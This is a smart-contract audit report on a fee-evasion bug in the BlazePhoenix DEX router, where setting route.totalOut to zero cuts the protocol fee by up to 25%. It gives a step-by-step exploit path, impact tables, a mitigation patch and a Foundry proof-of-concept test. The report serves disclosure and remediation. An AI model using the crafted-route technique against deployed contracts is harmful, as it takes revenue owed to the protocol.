# Protocol Fee Evasion via Crafted `route.totalOut`

## Severity: Medium

---

## Summary

The Router charges its 0.28% protocol fee on a `feeBase` that is meant to track the swap's real output, with a floor that supposedly prevents a caller from evading the fee by lying about the quote. In practice the floor doesn't stop evasion it only *caps* it. A caller who bypasses the Solver and submits a hand-built `Route` with `totalOut = 0` gets `feeBase` clamped down to `protocolFloorOut` (the on-chain safety-floor fraction of the real output, **75%–96%** depending on impact/leg count) instead of the true realised output. The gap between the floor fraction and 100% is paid out to the recipient as fee-exempt "surplus," and the treasuries collect a systematically smaller fee on every swap, with no market condition required, purely from calldata construction.

`BlazePhoenixRouter.sol`, `_execute()`:

```solidity
// ─── Fee base ───
// The fee is charged on the realised output, with the surplus policy
// preserved: any amount ABOVE the Solver-attested quote is fee-exempt.
// Crucially, the quote used here is clamped so a caller cannot drive
// the fee to zero by submitting totalOut = 0, the fee base is at least
// the protocol-floor fraction of what was actually received.
uint256 attestedQuote = route.totalOut;
uint256 feeBase = totalReceived > attestedQuote ? attestedQuote : totalReceived;
// Floor the fee base at protocolFloorOut so understating totalOut cannot
// evade the fee: you always pay on at least the guaranteed-floor amount.
if (feeBase < protocolFloorOut) feeBase = protocolFloorOut;
if (feeBase > totalReceived)    feeBase = totalReceived;

uint256 surplus = totalReceived > feeBase ? totalReceived - feeBase : 0;
uint256 fee = BPC.mulDiv(feeBase, PROTOCOL_FEE_BPS, BPC.BPS);
```

The comments describe the intent accurately the floor is there so `totalOut = 0` can't drive the fee to *literal zero*. But the floor is itself only a **fraction** of `totalReceived` (`protocolFloorOut = totalReceived × floorBps / BPS`, with `floorBps ∈ [7500, 9600]` per `Core.ironFloorBps`). Clamping `feeBase` at that floor still leaves `feeBase` strictly below `totalReceived` whenever `floorBps < 10000` which is **always**, since the floor's whole design purpose (per `WHITEPAPER.md` ) is to sit below 100%. The "cannot evade the fee" claim in both the code comment and `WHITEPAPER.md`  is therefore true only in the narrow sense of "cannot zero the fee"; it does not hold for "cannot reduce the fee."

### Exploit path

1. Attacker skips the Solver/Quoter entirely and hand-encodes a `Route` calldata blob for `swapExactIn` fully permitted, since the Router accepts any caller-supplied `Route` and re-derives its own safety floor independently (this is the documented design; see `SCOPE.md`).
2. Attacker sets `route.totalOut = 0` and `route.singleOutFloor = 0`. Neither field is validated against reality anywhere in `_execute()`.
3. Attacker sets `userMinOut` to whatever they actually expect to receive (or `0`), so the real slippage guard (`effMin`) never rejects the fill `route.totalOut` has no bearing on `effMin`; only `userMinOut` and the Router's own re-derived `protocolFloorOut` do.
4. Swap executes normally. `attestedQuote = 0`, so `feeBase = min(totalReceived, 0) = 0`, then clamps up to `protocolFloorOut ≈ totalReceived × floorBps/BPS`.
5. Fee is charged on `protocolFloorOut` instead of `totalReceived`. The difference (`totalReceived − protocolFloorOut`) is emitted as `Surplus` and paid to the recipient fee-free.
6. Repeat on every swap. No revert, no penalty, no on-chain signal that distinguishes this from an honest low quote.

---

## Impact

Measured with the attached PoC (`FeeEvasionPoC.t.sol`): a single clean V2 leg, deep reserves (negligible price impact → `floorBps ≈ 9600`, the best case for the protocol), `amountIn = 1e18`.

| Metric | Honest route (`totalOut` = true quote) | Crafted route (`totalOut = 0`) |
|--------|----------------------------------------:|--------------------------------:|
| Gross realised output | 996,999,999,005,991,000 | 996,999,999,005,991,000 (identical trade) |
| Fee base used | 996,999,999,005,991,000 (100%) | 956,159,999,045,751,360 (≈95.9%, floor fraction) |
| Fee charged | 2,791,599,997,216,774 | 2,679,656,837,328,382 |
| Effective fee rate | 28.00 bps (as intended) | 26.88 bps |
| Net delivered to recipient | 994,208,399,008,774,226 | 994,320,342,168,662,618 |
| **Fee revenue leaked** | — | **111,943,159,888,392 (≈4.01% of the fee owed)** |

**Scaling to worse routes (same `1e18` notional, per `Core.ironFloorBps`):**

| Route shape | `floorBps` | Effective fee rate paid | % of fee revenue lost vs. honest |
|-------------|-----------:|------------------------:|---------------------------------:|
| Clean single-leg (best case for protocol) | 9,600 (96%) | 26.88 bps | ~4.0% |
| Multi-leg / moderate impact | ~8,500 (85%) | 23.8 bps | ~15.0% |
| 5-leg / high-impact (hard floor) | 7,500 (75%) | 21.0 bps | **~25.0%** |

**Two ways to read the magnitude both matter:**

- **Against swap notional:** the absolute leak is small, ~**0.011%** of `amountIn` in the best case. Per-trade, this looks negligible.
- **Against protocol fee revenue (the number that matters):** the protocol systematically collects **4%–25% less fee revenue than intended** on every affected swap. This is not a rounding artifact or an edge case it is a deterministic, zero-cost, zero-risk discount available to any caller who skips the Solver, on every single trade, indefinitely. Any MEV searcher, integrator, or sufficiently motivated retail user extracting this at scale turns a "negligible per-trade leak" into continuous real revenue loss for the protocol.

No user funds are at risk and no slippage/floor guarantee is broken this is a revenue-integrity bug, not a funds-safety bug. It contradicts the explicit design claim in `WHITEPAPER.md` ("a zero-quote cannot evade the fee") and the inline code comment at the point of the bug.

---

## Mitigation

The floor should stop `totalOut` from **discounting** the fee, not merely from **zeroing** it. Concretely: the fee base must be pinned to `totalReceived` whenever the attested quote is missing or not credible, rather than being allowed to float down to `protocolFloorOut`.

The simplest, safest fix: only extend the surplus-fee-exemption credit when the attested quote is **credible** i.e. at least the protocol floor itself rather than checking only for the literal zero case. A naive `attestedQuote == 0` check is not sufficient: an attacker can set `totalOut = 1` (or any value below `protocolFloorOut`) and land on exactly the same discounted `feeBase` via the existing floor clamp, fully reopening the gap with a trivial calldata tweak. The condition must be `attestedQuote < protocolFloorOut`, not `attestedQuote == 0`:

```solidity
// ─── Fee base ───
// The fee is charged on the realised output. Any amount ABOVE a CREDIBLE
// Solver-attested quote is fee-exempt (the "surplus" policy) but a
// missing OR understated quote must not discount the fee below the full
// realised output. The floor exists to bound slippage, not to serve as
// a fee-base default.
uint256 attestedQuote = route.totalOut;

uint256 feeBase;
if (attestedQuote < protocolFloorOut) {
    // No credible quote was attested (zero, or below the protocol floor
    // itself) charge on the full realised output. This is the fix:
    // previously ANY attestedQuote below totalReceived clamped feeBase
    // down to protocolFloorOut, discounting the fee by up to 25%,
    // regardless of how small (including 0) the attacker set totalOut.
    feeBase = totalReceived;
} else {
    feeBase = totalReceived > attestedQuote ? attestedQuote : totalReceived;
}

uint256 surplus = totalReceived > feeBase ? totalReceived - feeBase : 0;
uint256 fee = BPC.mulDiv(feeBase, PROTOCOL_FEE_BPS, BPC.BPS);
```

**Why this closes the gap without new side effects:**

- Honest Solver-driven swaps are unaffected: a real quote is always `≥ protocolFloorOut` in the ordinary case (the Solver's own quote is meant to approximate `totalReceived`, which is always `≥ protocolFloorOut` by construction `protocolFloorOut` is *derived from* `totalReceived`). They take the `else` branch unchanged.
- Any attacker-supplied `totalOut` below the floor whether `0`, `1`, or anything else too low to be a genuine quote now pins `feeBase` to 100% of `totalReceived`, removing the incentive to understate the field at all: there is no longer a value of `totalOut` that yields a smaller fee than telling the truth.
- `userMinOut` and `protocolFloorOut`'s role in `effMin` (the slippage guard) are untouched; this fix only changes fee-base derivation, not the execution/slippage safety path.

---

## Proof of Concept

Add this test in `Blaze-Phoenix-Dex/test`

```solidity
// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.28;

// FEE EVASION POC: crafted `route.totalOut` shrinks the fee base down to
// `protocolFloorOut` instead of the true realised output. See report for
// full writeup.

import { Test } from "forge-std/Test.sol";
import { BlazePhoenixHub }    from "../src/BlazePhoenixHub.sol";
import { BlazePhoenixSolver } from "../src/BlazePhoenixSolver.sol";
import { BlazePhoenixRouter } from "../src/BlazePhoenixRouter.sol";
import { Route, Hop, Leg } from "../src/BlazePhoenixCore.sol";
import { MockERC20Exec, MockV2ExecPool } from "./RouterExecGuards.t.sol";

contract FeeEvasionPoC is Test {
    uint8  constant KIND_V2 = 0;
    uint16 constant PROTOCOL_FEE_BPS = 28;   // 0.28%, mirrors the Router constant
    uint256 constant BPS = 10_000;

    BlazePhoenixHub    hub;
    BlazePhoenixRouter router;
    MockERC20Exec      tin;
    MockERC20Exec      tout;
    MockV2ExecPool     pool;

    address recipientHonest = makeAddr("recipientHonest");
    address recipientEvil   = makeAddr("recipientEvil");
    address treasury1       = makeAddr("treasury1");
    address treasury2       = makeAddr("treasury2");

    uint256 constant RESERVE = 1e27;  // deep, so impact is negligible → floorBps ~= 9600
    uint256 constant AMT_IN  = 1e18;

    function setUp() public {
        hub = new BlazePhoenixHub();
        hub.initialize(address(this), makeAddr("v4mgr"));
        BlazePhoenixSolver solver = new BlazePhoenixSolver(address(hub));
        router = new BlazePhoenixRouter(
            address(hub), address(solver), address(this), treasury1, treasury2);

        tin  = new MockERC20Exec();
        tout = new MockERC20Exec();
        pool = new MockV2ExecPool(address(tin), address(tout), uint112(RESERVE), uint112(RESERVE));
        tout.mint(address(pool), RESERVE);
    }

    function _route(address rec, uint256 amt, uint256 craftedTotalOut)
        internal view returns (Route memory r)
    {
        rec;
        Leg memory leg = Leg({
            pool: address(pool), hooks: address(0), kind: KIND_V2, fee: 0, tickSpacing: 0,
            zeroForOne: true, stable: false, amountIn: amt, expectedOut: 0, auxId: bytes32(0)
        });
        Leg[] memory legs = new Leg[](1); legs[0] = leg;
        Hop[] memory hops = new Hop[](1);
        hops[0] = Hop({
            tokenIn: address(tin), tokenOut: address(tout),
            amountIn: amt, expectedOut: 0, legs: legs
        });
        r.hops = hops;
        r.totalOut = craftedTotalOut;
        r.singleOut = craftedTotalOut;
        r.singleOutFloor = 0;
    }

    /// @dev Router treats leg.fee == 0 as the default 30bps UniV2 fee
    ///      (_execV2Amt: v2fee = leg.fee == 0 ? 30 : leg.fee), not zero-fee.
    function _expectedOutV2(uint256 amt) internal pure returns (uint256) {
        uint256 feeBps = 30;
        uint256 amtFee = amt * (BPS - feeBps);
        return (amtFee * RESERVE) / (RESERVE * BPS + amtFee);
    }

    function test_feeEvasion_zeroTotalOut_paysLessFeeThanHonestRoute() public {
        uint256 expectedOut = _expectedOutV2(AMT_IN);

        // Run 1: honest route - totalOut set to the true attested quote.
        tin.mint(address(this), AMT_IN);
        Route memory honest = _route(recipientHonest, AMT_IN, expectedOut);

        uint256 t1Before = tout.balanceOf(treasury1);
        uint256 t2Before = tout.balanceOf(treasury2);
        uint256 outHonest = router.swapExactIn(honest, AMT_IN, 0, recipientHonest, block.timestamp + 1);
        uint256 feeHonest = (tout.balanceOf(treasury1) - t1Before) + (tout.balanceOf(treasury2) - t2Before);

        // Run 2: crafted route - totalOut = 0, same swap, same everything else.
        tin.mint(address(this), AMT_IN);
        Route memory crafted = _route(recipientEvil, AMT_IN, 0);

        t1Before = tout.balanceOf(treasury1);
        t2Before = tout.balanceOf(treasury2);
        uint256 outEvil = router.swapExactIn(crafted, AMT_IN, 0, recipientEvil, block.timestamp + 1);
        uint256 feeEvil = (tout.balanceOf(treasury1) - t1Before) + (tout.balanceOf(treasury2) - t2Before);

        // swapExactIn returns `delivered` (net-of-fee), so reconstruct gross
        // (delivered + fee) to compare the two runs like-for-like.
        uint256 grossHonest = outHonest + feeHonest;
        uint256 grossEvil   = outEvil   + feeEvil;

        assertGt(grossHonest, 0, "sanity: honest swap produced output");
        assertEq(grossHonest, grossEvil,
            "sanity: identical underlying swap should realise the same GROSS output");

        // THE BUG: smaller fee, larger net payout, for the identical trade.
        assertLt(feeEvil, feeHonest,
            "BUG NOT REPRODUCED: crafted totalOut=0 did not reduce the fee");
        assertGt(outEvil, outHonest,
            "BUG NOT REPRODUCED: crafted route should net MORE to the recipient than the honest route");

        uint256 honestFeeExpected = (grossHonest * PROTOCOL_FEE_BPS) / BPS;
        assertApproxEqAbs(feeHonest, honestFeeExpected, 2,
            "honest fee should be ~0.28% of the full gross output");
        assertLt(feeEvil, honestFeeExpected,
            "crafted fee should be strictly below 0.28% of the full gross output");

        uint256 leaked = feeHonest > feeEvil ? feeHonest - feeEvil : 0;
        emit log_named_uint("gross realised output (both runs)", grossHonest);
        emit log_named_uint("fee paid (honest route)          ", feeHonest);
        emit log_named_uint("fee paid (crafted route)         ", feeEvil);
        emit log_named_uint("fee revenue leaked to attacker    ", leaked);
        assertGt(leaked, 0, "protocol must lose real fee revenue to the crafted route");
    }

    /// @dev Confirms the discount lands exactly on the ~96% floor fraction,
    ///      not some unrelated effect.
    function test_feeEvasion_matchesFloorFractionExactly() public {
        uint256 expectedOut = _expectedOutV2(AMT_IN);
        tin.mint(address(this), AMT_IN);
        Route memory crafted = _route(recipientEvil, AMT_IN, 0);

        uint256 t1Before = tout.balanceOf(treasury1);
        uint256 t2Before = tout.balanceOf(treasury2);
        uint256 outEvil = router.swapExactIn(crafted, AMT_IN, 0, recipientEvil, block.timestamp + 1);
        uint256 feeEvil = (tout.balanceOf(treasury1) - t1Before) + (tout.balanceOf(treasury2) - t2Before);
        uint256 grossEvil = outEvil + feeEvil;

        assertApproxEqAbs(grossEvil, expectedOut, 2, "reconstructed gross should match outV2");

        uint256 nearFloorFeeUpperBound = (grossEvil * 9600 / BPS) * PROTOCOL_FEE_BPS / BPS;
        assertLe(feeEvil, nearFloorFeeUpperBound + 2,
            "crafted fee should be at/under the ~96% floor-fraction fee, not the full-amount fee");
    }
}
```